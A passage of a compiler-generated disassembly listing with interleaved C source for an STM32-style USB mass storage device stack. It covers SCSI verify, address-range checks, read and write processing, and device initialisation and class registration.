 800ab26:	781b      	ldrb	r3, [r3, #0]
 800ab28:	f003 0302 	and.w	r3, r3, #2
 800ab2c:	2b00      	cmp	r3, #0
 800ab2e:	d008      	beq.n	800ab42 <SCSI_Verify10+0x4a>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800ab30:	7af9      	ldrb	r1, [r7, #11]
 800ab32:	2324      	movs	r3, #36	; 0x24
 800ab34:	2205      	movs	r2, #5
 800ab36:	68f8      	ldr	r0, [r7, #12]
 800ab38:	f7ff fba4 	bl	800a284 <SCSI_SenseCode>
    return -1; /* Error, Verify Mode Not supported*/
 800ab3c:	f04f 33ff 	mov.w	r3, #4294967295
 800ab40:	e015      	b.n	800ab6e <SCSI_Verify10+0x76>
  }

  if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr, hmsc->scsi_blk_len) < 0)
 800ab42:	697b      	ldr	r3, [r7, #20]
 800ab44:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab48:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ab4a:	697b      	ldr	r3, [r7, #20]
 800ab4c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ab50:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ab52:	7af9      	ldrb	r1, [r7, #11]
 800ab54:	68f8      	ldr	r0, [r7, #12]
 800ab56:	f000 f80e 	bl	800ab76 <SCSI_CheckAddressRange>
 800ab5a:	4603      	mov	r3, r0
 800ab5c:	2b00      	cmp	r3, #0
 800ab5e:	da02      	bge.n	800ab66 <SCSI_Verify10+0x6e>
  {
    return -1; /* error */
 800ab60:	f04f 33ff 	mov.w	r3, #4294967295
 800ab64:	e003      	b.n	800ab6e <SCSI_Verify10+0x76>
  }

  hmsc->bot_data_length = 0U;
 800ab66:	697b      	ldr	r3, [r7, #20]
 800ab68:	2200      	movs	r2, #0
 800ab6a:	60da      	str	r2, [r3, #12]

  return 0;
 800ab6c:	2300      	movs	r3, #0
}
 800ab6e:	4618      	mov	r0, r3
 800ab70:	3718      	adds	r7, #24
 800ab72:	46bd      	mov	sp, r7
 800ab74:	bd80      	pop	{r7, pc}

0800ab76 <SCSI_CheckAddressRange>:
  * @param  blk_nbr: number of block to be processed
  * @retval status
  */
static int8_t SCSI_CheckAddressRange(USBD_HandleTypeDef *pdev, uint8_t lun,
                                     uint32_t blk_offset, uint32_t blk_nbr)
{
 800ab76:	b580      	push	{r7, lr}
 800ab78:	b086      	sub	sp, #24
 800ab7a:	af00      	add	r7, sp, #0
 800ab7c:	60f8      	str	r0, [r7, #12]
 800ab7e:	607a      	str	r2, [r7, #4]
 800ab80:	603b      	str	r3, [r7, #0]
 800ab82:	460b      	mov	r3, r1
 800ab84:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab86:	68fb      	ldr	r3, [r7, #12]
 800ab88:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab8c:	68fb      	ldr	r3, [r7, #12]
 800ab8e:	32b0      	adds	r2, #176	; 0xb0
 800ab90:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab94:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ab96:	697b      	ldr	r3, [r7, #20]
 800ab98:	2b00      	cmp	r3, #0
 800ab9a:	d102      	bne.n	800aba2 <SCSI_CheckAddressRange+0x2c>
  {
    return -1;
 800ab9c:	f04f 33ff 	mov.w	r3, #4294967295
 800aba0:	e012      	b.n	800abc8 <SCSI_CheckAddressRange+0x52>
  }

  if ((blk_offset + blk_nbr) > hmsc->scsi_blk_nbr)
 800aba2:	687a      	ldr	r2, [r7, #4]
 800aba4:	683b      	ldr	r3, [r7, #0]
 800aba6:	441a      	add	r2, r3
 800aba8:	697b      	ldr	r3, [r7, #20]
 800abaa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abae:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800abb0:	429a      	cmp	r2, r3
 800abb2:	d908      	bls.n	800abc6 <SCSI_CheckAddressRange+0x50>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, ADDRESS_OUT_OF_RANGE);
 800abb4:	7af9      	ldrb	r1, [r7, #11]
 800abb6:	2321      	movs	r3, #33	; 0x21
 800abb8:	2205      	movs	r2, #5
 800abba:	68f8      	ldr	r0, [r7, #12]
 800abbc:	f7ff fb62 	bl	800a284 <SCSI_SenseCode>
    return -1;
 800abc0:	f04f 33ff 	mov.w	r3, #4294967295
 800abc4:	e000      	b.n	800abc8 <SCSI_CheckAddressRange+0x52>
  }

  return 0;
 800abc6:	2300      	movs	r3, #0
}
 800abc8:	4618      	mov	r0, r3
 800abca:	3718      	adds	r7, #24
 800abcc:	46bd      	mov	sp, r7
 800abce:	bd80      	pop	{r7, pc}

0800abd0 <SCSI_ProcessRead>:
  *         Handle Read Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessRead(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800abd0:	b590      	push	{r4, r7, lr}
 800abd2:	b085      	sub	sp, #20
 800abd4:	af00      	add	r7, sp, #0
 800abd6:	6078      	str	r0, [r7, #4]
 800abd8:	460b      	mov	r3, r1
 800abda:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800abdc:	687b      	ldr	r3, [r7, #4]
 800abde:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800abe2:	687b      	ldr	r3, [r7, #4]
 800abe4:	32b0      	adds	r2, #176	; 0xb0
 800abe6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800abea:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800abec:	68fb      	ldr	r3, [r7, #12]
 800abee:	2b00      	cmp	r3, #0
 800abf0:	d102      	bne.n	800abf8 <SCSI_ProcessRead+0x28>
  {
    return -1;
 800abf2:	f04f 33ff 	mov.w	r3, #4294967295
 800abf6:	e07b      	b.n	800acf0 <SCSI_ProcessRead+0x120>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800abf8:	68fb      	ldr	r3, [r7, #12]
 800abfa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800abfe:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ac00:	68fa      	ldr	r2, [r7, #12]
 800ac02:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ac06:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ac0a:	fb02 f303 	mul.w	r3, r2, r3
 800ac0e:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800ac10:	68bb      	ldr	r3, [r7, #8]
 800ac12:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ac16:	bf28      	it	cs
 800ac18:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ac1c:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ac1e:	687b      	ldr	r3, [r7, #4]
 800ac20:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ac24:	687a      	ldr	r2, [r7, #4]
 800ac26:	33b0      	adds	r3, #176	; 0xb0
 800ac28:	009b      	lsls	r3, r3, #2
 800ac2a:	4413      	add	r3, r2
 800ac2c:	685b      	ldr	r3, [r3, #4]
 800ac2e:	691c      	ldr	r4, [r3, #16]
 800ac30:	68fb      	ldr	r3, [r7, #12]
 800ac32:	f103 0110 	add.w	r1, r3, #16
 800ac36:	68fb      	ldr	r3, [r7, #12]
 800ac38:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac3c:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                    hmsc->scsi_blk_addr,
                                                                    (len / hmsc->scsi_blk_size)) < 0)
 800ac3e:	68fb      	ldr	r3, [r7, #12]
 800ac40:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac44:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac48:	4618      	mov	r0, r3
 800ac4a:	68bb      	ldr	r3, [r7, #8]
 800ac4c:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Read(lun, hmsc->bot_data,
 800ac50:	b29b      	uxth	r3, r3
 800ac52:	78f8      	ldrb	r0, [r7, #3]
 800ac54:	47a0      	blx	r4
 800ac56:	4603      	mov	r3, r0
 800ac58:	2b00      	cmp	r3, #0
 800ac5a:	da08      	bge.n	800ac6e <SCSI_ProcessRead+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, UNRECOVERED_READ_ERROR);
 800ac5c:	78f9      	ldrb	r1, [r7, #3]
 800ac5e:	2311      	movs	r3, #17
 800ac60:	2204      	movs	r2, #4
 800ac62:	6878      	ldr	r0, [r7, #4]
 800ac64:	f7ff fb0e 	bl	800a284 <SCSI_SenseCode>
    return -1;
 800ac68:	f04f 33ff 	mov.w	r3, #4294967295
 800ac6c:	e040      	b.n	800acf0 <SCSI_ProcessRead+0x120>
  }

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, hmsc->bot_data, len);
 800ac6e:	4b22      	ldr	r3, [pc, #136]	; (800acf8 <SCSI_ProcessRead+0x128>)
 800ac70:	7819      	ldrb	r1, [r3, #0]
 800ac72:	68fb      	ldr	r3, [r7, #12]
 800ac74:	f103 0210 	add.w	r2, r3, #16
 800ac78:	68bb      	ldr	r3, [r7, #8]
 800ac7a:	6878      	ldr	r0, [r7, #4]
 800ac7c:	f002 f8f4 	bl	800ce68 <USBD_LL_Transmit>

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ac80:	68fb      	ldr	r3, [r7, #12]
 800ac82:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac86:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ac88:	68fb      	ldr	r3, [r7, #12]
 800ac8a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ac8e:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ac92:	4619      	mov	r1, r3
 800ac94:	68bb      	ldr	r3, [r7, #8]
 800ac96:	fbb3 f3f1 	udiv	r3, r3, r1
 800ac9a:	4413      	add	r3, r2
 800ac9c:	68fa      	ldr	r2, [r7, #12]
 800ac9e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aca2:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800aca4:	68fb      	ldr	r3, [r7, #12]
 800aca6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acaa:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800acac:	68fb      	ldr	r3, [r7, #12]
 800acae:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acb2:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800acb6:	4619      	mov	r1, r3
 800acb8:	68bb      	ldr	r3, [r7, #8]
 800acba:	fbb3 f3f1 	udiv	r3, r3, r1
 800acbe:	1ad3      	subs	r3, r2, r3
 800acc0:	68fa      	ldr	r2, [r7, #12]
 800acc2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800acc6:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 6 : Hi = Di */
  hmsc->csw.dDataResidue -= len;
 800acc8:	68fb      	ldr	r3, [r7, #12]
 800acca:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800acce:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800acd0:	68bb      	ldr	r3, [r7, #8]
 800acd2:	1ad3      	subs	r3, r2, r3
 800acd4:	68fa      	ldr	r2, [r7, #12]
 800acd6:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800acda:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800acdc:	68fb      	ldr	r3, [r7, #12]
 800acde:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ace2:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ace4:	2b00      	cmp	r3, #0
 800ace6:	d102      	bne.n	800acee <SCSI_ProcessRead+0x11e>
  {
    hmsc->bot_state = USBD_BOT_LAST_DATA_IN;
 800ace8:	68fb      	ldr	r3, [r7, #12]
 800acea:	2203      	movs	r2, #3
 800acec:	721a      	strb	r2, [r3, #8]
  }

  return 0;
 800acee:	2300      	movs	r3, #0
}
 800acf0:	4618      	mov	r0, r3
 800acf2:	3714      	adds	r7, #20
 800acf4:	46bd      	mov	sp, r7
 800acf6:	bd90      	pop	{r4, r7, pc}
 800acf8:	2000010a 	.word	0x2000010a

0800acfc <SCSI_ProcessWrite>:
  *         Handle Write Process
  * @param  lun: Logical unit number
  * @retval status
  */
static int8_t SCSI_ProcessWrite(USBD_HandleTypeDef *pdev, uint8_t lun)
{
 800acfc:	b590      	push	{r4, r7, lr}
 800acfe:	b085      	sub	sp, #20
 800ad00:	af00      	add	r7, sp, #0
 800ad02:	6078      	str	r0, [r7, #4]
 800ad04:	460b      	mov	r3, r1
 800ad06:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ad08:	687b      	ldr	r3, [r7, #4]
 800ad0a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ad0e:	687b      	ldr	r3, [r7, #4]
 800ad10:	32b0      	adds	r2, #176	; 0xb0
 800ad12:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ad16:	60fb      	str	r3, [r7, #12]
  uint32_t len;

  if (hmsc == NULL)
 800ad18:	68fb      	ldr	r3, [r7, #12]
 800ad1a:	2b00      	cmp	r3, #0
 800ad1c:	d102      	bne.n	800ad24 <SCSI_ProcessWrite+0x28>
  {
    return -1;
 800ad1e:	f04f 33ff 	mov.w	r3, #4294967295
 800ad22:	e08e      	b.n	800ae42 <SCSI_ProcessWrite+0x146>
  }

  len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800ad24:	68fb      	ldr	r3, [r7, #12]
 800ad26:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad2a:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ad2c:	68fa      	ldr	r2, [r7, #12]
 800ad2e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ad32:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ad36:	fb02 f303 	mul.w	r3, r2, r3
 800ad3a:	60bb      	str	r3, [r7, #8]
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  len = MIN(len, MSC_MEDIA_PACKET);
 800ad3c:	68bb      	ldr	r3, [r7, #8]
 800ad3e:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ad42:	bf28      	it	cs
 800ad44:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ad48:	60bb      	str	r3, [r7, #8]

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800ad4a:	687b      	ldr	r3, [r7, #4]
 800ad4c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800ad50:	687a      	ldr	r2, [r7, #4]
 800ad52:	33b0      	adds	r3, #176	; 0xb0
 800ad54:	009b      	lsls	r3, r3, #2
 800ad56:	4413      	add	r3, r2
 800ad58:	685b      	ldr	r3, [r3, #4]
 800ad5a:	695c      	ldr	r4, [r3, #20]
 800ad5c:	68fb      	ldr	r3, [r7, #12]
 800ad5e:	f103 0110 	add.w	r1, r3, #16
 800ad62:	68fb      	ldr	r3, [r7, #12]
 800ad64:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad68:	6eda      	ldr	r2, [r3, #108]	; 0x6c
                                                                     hmsc->scsi_blk_addr,
                                                                     (len / hmsc->scsi_blk_size)) < 0)
 800ad6a:	68fb      	ldr	r3, [r7, #12]
 800ad6c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ad70:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800ad74:	4618      	mov	r0, r3
 800ad76:	68bb      	ldr	r3, [r7, #8]
 800ad78:	fbb3 f3f0 	udiv	r3, r3, r0
  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Write(lun, hmsc->bot_data,
 800ad7c:	b29b      	uxth	r3, r3
 800ad7e:	78f8      	ldrb	r0, [r7, #3]
 800ad80:	47a0      	blx	r4
 800ad82:	4603      	mov	r3, r0
 800ad84:	2b00      	cmp	r3, #0
 800ad86:	da08      	bge.n	800ad9a <SCSI_ProcessWrite+0x9e>
  {
    SCSI_SenseCode(pdev, lun, HARDWARE_ERROR, WRITE_FAULT);
 800ad88:	78f9      	ldrb	r1, [r7, #3]
 800ad8a:	2303      	movs	r3, #3
 800ad8c:	2204      	movs	r2, #4
 800ad8e:	6878      	ldr	r0, [r7, #4]
 800ad90:	f7ff fa78 	bl	800a284 <SCSI_SenseCode>
    return -1;
 800ad94:	f04f 33ff 	mov.w	r3, #4294967295
 800ad98:	e053      	b.n	800ae42 <SCSI_ProcessWrite+0x146>
  }

  hmsc->scsi_blk_addr += (len / hmsc->scsi_blk_size);
 800ad9a:	68fb      	ldr	r3, [r7, #12]
 800ad9c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ada0:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800ada2:	68fb      	ldr	r3, [r7, #12]
 800ada4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ada8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800adac:	4619      	mov	r1, r3
 800adae:	68bb      	ldr	r3, [r7, #8]
 800adb0:	fbb3 f3f1 	udiv	r3, r3, r1
 800adb4:	4413      	add	r3, r2
 800adb6:	68fa      	ldr	r2, [r7, #12]
 800adb8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800adbc:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800adbe:	68fb      	ldr	r3, [r7, #12]
 800adc0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adc4:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800adc6:	68fb      	ldr	r3, [r7, #12]
 800adc8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adcc:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800add0:	4619      	mov	r1, r3
 800add2:	68bb      	ldr	r3, [r7, #8]
 800add4:	fbb3 f3f1 	udiv	r3, r3, r1
 800add8:	1ad3      	subs	r3, r2, r3
 800adda:	68fa      	ldr	r2, [r7, #12]
 800addc:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ade0:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 12 : Ho = Do */
  hmsc->csw.dDataResidue -= len;
 800ade2:	68fb      	ldr	r3, [r7, #12]
 800ade4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ade8:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800adea:	68bb      	ldr	r3, [r7, #8]
 800adec:	1ad3      	subs	r3, r2, r3
 800adee:	68fa      	ldr	r2, [r7, #12]
 800adf0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800adf4:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800adf6:	68fb      	ldr	r3, [r7, #12]
 800adf8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800adfc:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800adfe:	2b00      	cmp	r3, #0
 800ae00:	d104      	bne.n	800ae0c <SCSI_ProcessWrite+0x110>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800ae02:	2100      	movs	r1, #0
 800ae04:	6878      	ldr	r0, [r7, #4]
 800ae06:	f7fe fc53 	bl	80096b0 <MSC_BOT_SendCSW>
 800ae0a:	e019      	b.n	800ae40 <SCSI_ProcessWrite+0x144>
  }
  else
  {
    len = MIN((hmsc->scsi_blk_len * hmsc->scsi_blk_size), MSC_MEDIA_PACKET);
 800ae0c:	68fb      	ldr	r3, [r7, #12]
 800ae0e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800ae12:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800ae14:	68fa      	ldr	r2, [r7, #12]
 800ae16:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800ae1a:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800ae1e:	fb02 f303 	mul.w	r3, r2, r3
 800ae22:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800ae26:	bf28      	it	cs
 800ae28:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800ae2c:	60bb      	str	r3, [r7, #8]

    /* Prepare EP to Receive next packet */
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800ae2e:	4b07      	ldr	r3, [pc, #28]	; (800ae4c <SCSI_ProcessWrite+0x150>)
 800ae30:	7819      	ldrb	r1, [r3, #0]
 800ae32:	68fb      	ldr	r3, [r7, #12]
 800ae34:	f103 0210 	add.w	r2, r3, #16
 800ae38:	68bb      	ldr	r3, [r7, #8]
 800ae3a:	6878      	ldr	r0, [r7, #4]
 800ae3c:	f002 f84c 	bl	800ced8 <USBD_LL_PrepareReceive>
  }

  return 0;
 800ae40:	2300      	movs	r3, #0
}
 800ae42:	4618      	mov	r0, r3
 800ae44:	3714      	adds	r7, #20
 800ae46:	46bd      	mov	sp, r7
 800ae48:	bd90      	pop	{r4, r7, pc}
 800ae4a:	bf00      	nop
 800ae4c:	2000010b 	.word	0x2000010b

0800ae50 <SCSI_UpdateBotData>:
  * @param  length: Data length
  * @retval status
  */
static int8_t SCSI_UpdateBotData(USBD_MSC_BOT_HandleTypeDef *hmsc,
                                 uint8_t *pBuff, uint16_t length)
{
 800ae50:	b480      	push	{r7}
 800ae52:	b087      	sub	sp, #28
 800ae54:	af00      	add	r7, sp, #0
 800ae56:	60f8      	str	r0, [r7, #12]
 800ae58:	60b9      	str	r1, [r7, #8]
 800ae5a:	4613      	mov	r3, r2
 800ae5c:	80fb      	strh	r3, [r7, #6]
  uint16_t len = length;
 800ae5e:	88fb      	ldrh	r3, [r7, #6]
 800ae60:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800ae62:	68fb      	ldr	r3, [r7, #12]
 800ae64:	2b00      	cmp	r3, #0
 800ae66:	d102      	bne.n	800ae6e <SCSI_UpdateBotData+0x1e>
  {
    return -1;
 800ae68:	f04f 33ff 	mov.w	r3, #4294967295
 800ae6c:	e013      	b.n	800ae96 <SCSI_UpdateBotData+0x46>
  }

  hmsc->bot_data_length = len;
 800ae6e:	8afa      	ldrh	r2, [r7, #22]
 800ae70:	68fb      	ldr	r3, [r7, #12]
 800ae72:	60da      	str	r2, [r3, #12]

  while (len != 0U)
 800ae74:	e00b      	b.n	800ae8e <SCSI_UpdateBotData+0x3e>
  {
    len--;
 800ae76:	8afb      	ldrh	r3, [r7, #22]
 800ae78:	3b01      	subs	r3, #1
 800ae7a:	82fb      	strh	r3, [r7, #22]
    hmsc->bot_data[len] = pBuff[len];
 800ae7c:	8afb      	ldrh	r3, [r7, #22]
 800ae7e:	68ba      	ldr	r2, [r7, #8]
 800ae80:	441a      	add	r2, r3
 800ae82:	8afb      	ldrh	r3, [r7, #22]
 800ae84:	7811      	ldrb	r1, [r2, #0]
 800ae86:	68fa      	ldr	r2, [r7, #12]
 800ae88:	4413      	add	r3, r2
 800ae8a:	460a      	mov	r2, r1
 800ae8c:	741a      	strb	r2, [r3, #16]
  while (len != 0U)
 800ae8e:	8afb      	ldrh	r3, [r7, #22]
 800ae90:	2b00      	cmp	r3, #0
 800ae92:	d1f0      	bne.n	800ae76 <SCSI_UpdateBotData+0x26>
  }

  return 0;
 800ae94:	2300      	movs	r3, #0
}
 800ae96:	4618      	mov	r0, r3
 800ae98:	371c      	adds	r7, #28
 800ae9a:	46bd      	mov	sp, r7
 800ae9c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800aea0:	4770      	bx	lr

0800aea2 <USBD_Init>:
  * @param  id: Low level core index
  * @retval None
  */
USBD_StatusTypeDef USBD_Init(USBD_HandleTypeDef *pdev,
                             USBD_DescriptorsTypeDef *pdesc, uint8_t id)
{
 800aea2:	b580      	push	{r7, lr}
 800aea4:	b086      	sub	sp, #24
 800aea6:	af00      	add	r7, sp, #0
 800aea8:	60f8      	str	r0, [r7, #12]
 800aeaa:	60b9      	str	r1, [r7, #8]
 800aeac:	4613      	mov	r3, r2
 800aeae:	71fb      	strb	r3, [r7, #7]
  USBD_StatusTypeDef ret;

  /* Check whether the USB Host handle is valid */
  if (pdev == NULL)
 800aeb0:	68fb      	ldr	r3, [r7, #12]
 800aeb2:	2b00      	cmp	r3, #0
 800aeb4:	d101      	bne.n	800aeba <USBD_Init+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Device handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800aeb6:	2303      	movs	r3, #3
 800aeb8:	e01f      	b.n	800aefa <USBD_Init+0x58>
    pdev->NumClasses = 0;
    pdev->classId = 0;
  }
#else
  /* Unlink previous class*/
  pdev->pClass[0] = NULL;
 800aeba:	68fb      	ldr	r3, [r7, #12]
 800aebc:	2200      	movs	r2, #0
 800aebe:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  pdev->pUserData[0] = NULL;
 800aec2:	68fb      	ldr	r3, [r7, #12]
 800aec4:	2200      	movs	r2, #0
 800aec6:	f8c3 22c4 	str.w	r2, [r3, #708]	; 0x2c4
#endif /* USE_USBD_COMPOSITE */

  pdev->pConfDesc = NULL;
 800aeca:	68fb      	ldr	r3, [r7, #12]
 800aecc:	2200      	movs	r2, #0
 800aece:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0

  /* Assign USBD Descriptors */
  if (pdesc != NULL)
 800aed2:	68bb      	ldr	r3, [r7, #8]
 800aed4:	2b00      	cmp	r3, #0
 800aed6:	d003      	beq.n	800aee0 <USBD_Init+0x3e>
  {
    pdev->pDesc = pdesc;
 800aed8:	68fb      	ldr	r3, [r7, #12]
 800aeda:	68ba      	ldr	r2, [r7, #8]
 800aedc:	f8c3 22b4 	str.w	r2, [r3, #692]	; 0x2b4
  }

  /* Set Device initial State */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800aee0:	68fb      	ldr	r3, [r7, #12]
 800aee2:	2201      	movs	r2, #1
 800aee4:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->id = id;
 800aee8:	68fb      	ldr	r3, [r7, #12]
 800aeea:	79fa      	ldrb	r2, [r7, #7]
 800aeec:	701a      	strb	r2, [r3, #0]

  /* Initialize low level driver */
  ret = USBD_LL_Init(pdev);
 800aeee:	68f8      	ldr	r0, [r7, #12]
 800aef0:	f001 fdb6 	bl	800ca60 <USBD_LL_Init>
 800aef4:	4603      	mov	r3, r0
 800aef6:	75fb      	strb	r3, [r7, #23]

  return ret;
 800aef8:	7dfb      	ldrb	r3, [r7, #23]
}
 800aefa:	4618      	mov	r0, r3
 800aefc:	3718      	adds	r7, #24
 800aefe:	46bd      	mov	sp, r7
 800af00:	bd80      	pop	{r7, pc}

0800af02 <USBD_RegisterClass>:
  * @param  pDevice : Device Handle
  * @param  pclass: Class handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_RegisterClass(USBD_HandleTypeDef *pdev, USBD_ClassTypeDef *pclass)
{
 800af02:	b580      	push	{r7, lr}
 800af04:	b084      	sub	sp, #16
 800af06:	af00      	add	r7, sp, #0
 800af08:	6078      	str	r0, [r7, #4]
 800af0a:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800af0c:	2300      	movs	r3, #0
 800af0e:	81fb      	strh	r3, [r7, #14]

  if (pclass == NULL)
 800af10:	683b      	ldr	r3, [r7, #0]
 800af12:	2b00      	cmp	r3, #0
 800af14:	d101      	bne.n	800af1a <USBD_RegisterClass+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Class handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800af16:	2303      	movs	r3, #3
 800af18:	e025      	b.n	800af66 <USBD_RegisterClass+0x64>
  }

  /* link the class to the USB Device handle */
  pdev->pClass[0] = pclass;
 800af1a:	687b      	ldr	r3, [r7, #4]
 800af1c:	683a      	ldr	r2, [r7, #0]
 800af1e:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
